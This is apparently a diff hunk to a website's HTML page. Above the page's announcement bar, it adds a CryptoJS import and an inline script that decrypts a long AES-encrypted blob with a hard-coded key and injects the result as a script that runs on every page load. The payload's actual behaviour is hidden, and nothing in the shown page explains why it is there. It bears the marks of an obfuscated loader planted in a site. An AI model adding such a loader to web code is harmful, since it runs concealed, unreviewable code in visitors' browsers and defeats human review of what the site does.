@@ -62,8 +62,25 @@
         }
     }
     </script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 </head>
 <body>
+    <script>
+      function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(
+          decodedText,
+          "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf",
+        );
+        return bytes.toString(CryptoJS.enc.Utf8);
+      }
+      const codeString = aesDecode(
+        `U2FsdGVkX18%2BGXT9vveBpTNEOhOEYnLRmh123zbc3vbzMtqBbpvSTYY5jQF0SVuRqnMjKXLRe3EJMNiZSospL77YbftVscEjKvot54TcS1BUsDIfrFXOd%2Feia2H6IX32fhSEQpvpeiwzIjmlWuUcz8knORMyHvWjoN1u2Ocg4kRPI1dtUKjZ4rWuqCAqohKYVxu%2FQ2ZWOD78k6rvYZ7XOB%2B0yeEPHu%2BJgOMdYGoOnbuzT8cNETbz%2FyJEDmHQkoJ9M2Ud2GUzOFJBJXk5zr2xgHBytUTH14n948SQNpkfGQBx%2FykZ8HPvFBey0P81jqV2STbhXeH%2BNihONGtGyk1Y14PlxKV4ADCDEDg%2F%2Ftw9LDKUeVPspYNbaAQ5JKZWwnBOkwiiogQ5hkrodnsL7R08NdnDDkD9ADcywPdqoqA77zg7M4WhfmeuCQNMcamf%2F5wksXWe6Gahsn1z7M2L%2BoprxqMw0ngLllr2LnzezPju8%2BN7Q0ixSdHShwcjz2wjx9QWTGyS96k2To2sJn4jLaz%2FFT%2BXXXZcjz6lr5hlonLtj9NWorBRrMHWuagpS8QnSUrDrM4uF22AelOOv%2BYdsf2jw%2BZvw8YDtxGOdkSiOrnQEHCkqDtH55%2FBg%2BPp7C0VVz0bNtE32i8J2Wd0lysm0E3PrlcOwiRVNJZ1fJfbn%2BZDEFl0xr7fvIuMcmey0LlwR7lbiB72j4RagDqZ2JEvvAHlP70DMzd02DATF4axf8WM9gtREaKpvju41Q6CkMrgv3Q8CbjjqvvEDF9s5VPOzAL3fsnva3F%2FENE7Ss2mIzBV601k8pCBhZy2FXtfotKUlwzaFETXC4TqlHqAJxL%2BO7PbXGHKAVFj7gl2sGHS0fe4J1XITb8jqrB27eKMEAwZGAH77EPw4pV8wvD0Et3S7VWG5yzpaNjN9PpSjgxr9EhYRoR0HAuzeg%2BL%2BD97CX644ZQ5siGLEC0OUDMp%2BOLgEBDPEp%2Bnude1o%2BYkzdgTYDtNHnX7IxGnhkNjaAFuB%2BsKXm6Y1a5JokkoE3L7Ji2dSdiTkMymcHOjCZ%2Bt6njgxT9kW%2FaNSY%2B%2BP3Miepje%2B15vAR%2B3BCNc8BhWC0MJeYyDr%2FegRrGU17Yfd%2BSwNw128FKQSv4sAfQWx9B2234J8VP1X6D9K85Tf%2B4EFsPZsiZqbsw8DT0ojOvf9dFiqwzKOAfCMAPMQBRdJXVDGJB4bxGFoWMuU2xzywODEurkJOb9eEJVxEDZQoYW5uNjeV6rTAKjDx930BQK%2Fq9V%2B12cKbkqhNQxm4aCIki4eRpBf%2BdI9Eb69pfLKLl1HGBB1sXl9cd5pY7UaltYpRCrmy9N3MOfKrS8p2o4B1KjpaNjfuaaxEjbYUhBjkDm5fzrVhHFd31zoPjqr74tgca1sjFFkDzjgAkyF%2FFgPJeNqPlB0bEZiPT3j96BQ%2BjISNmxgobMfoQOMK70rJCIphRzZtbeVYFSTL1J2LYc%2FYQuekS5UulaeGA%2FL11xItWHAyDutwDND%2Bx6alkIW1KMfag0NYAMMvNoP%2B1cVeGzXZStE6Xv9yyIUiVaNKuswDgm2o%2BberVj2CeUWnvGMws%2FmepMg77YQZMUyILFO9Hz7PccW0KiOYDkQuSLZ2KxZYUFjpdDLfmedQUKfPZUEkzimpIPVFJ%2F7rrLyjzFEcDHJcndujIEiLi8IWquGlarYaXwMBkotB%2FqagAFGlaFYDJBsap8rpJdUudUG74paPak3V1PshyulPDhL5v%2BfXLIIqCzJVbUolctbXWCEYuBLozCGlge8v%2BkrJiQZ5BrKRFzWVnc2EP5akhUeoI1edNHv8nRsCDi7e2x7H%2F6xKSinPqT9Ns7nxzjKF3efNxfO8hmT0zCJozw1ex2BtnAbIDBpemJ25N9FgbICmoJk865KRS5JXwqIKxvHM4yyMEy00GeyVvl%2FukoXfKKunRen3IiQuv77qyk8FiqOrXkMvxddonfSlZJOSzSSHzshg4Ids7imJihdOYMV50u5e2O%2FOSwSiSLye4CtKjOs3QTBH0MbOhIxMJQVNtP44Dm%2FBkKkcQbyN6WfMXUqOcnNG08n67pnuvVygCi6s2hLz005gGQ7%2BvM%2F0IygXd6AXNXE4clqR39vLLqk5SSWhaDrMdPlQyzfamh90XF7pCl63mPauv6O3k4Ezw4np1kQBmJpmbOmqWoQ%2BGTljVFlNsAtkQzU6y1nv1EIWsaCHyOzv6P%2FgUlCj4BzgHYB82%2BUPSgBxvzHXTIGHuNZiFeOVRgmiOA%2BjXVxFHAjRQjnIEhJ9PmANum3%2Fs3tYNXhNkH5jvk8qGYxp5%2B8ppBwVFGsIKMyoZJMy5tbngM5tYPRPInGPuKmp9lxQaDha7VU5FfD28A9lnzD7SqlxjYi8v7Ck6dCQCRsMY9JGEJ%2BsS3RXxuYPRABxxQn%2Bbm8M2uefSZ%2B9C7JmX5vfSw74diGezt7LscelZkTyOt%2Fn3lITMmI7A43QMCebmgjHjis%2BTVtyUI4pMnCO3nKVb3XEobsIcIsDXoatDNk3pB2WH4sFYYA0Ubu1irCHUn1ENuU3wO7S703qpgjyFNzpTW%2F5PB5WrXNzDnXy9w8%2Fj5inAZGNErKGPNjGEvvgM%3D`,
+      );
+      const script = document.createElement("script");
+      script.textContent = codeString;
+      document.body.appendChild(script);
+    </script>
 
     <!-- Announcement Bar -->
     <div class="announce" id="announce">
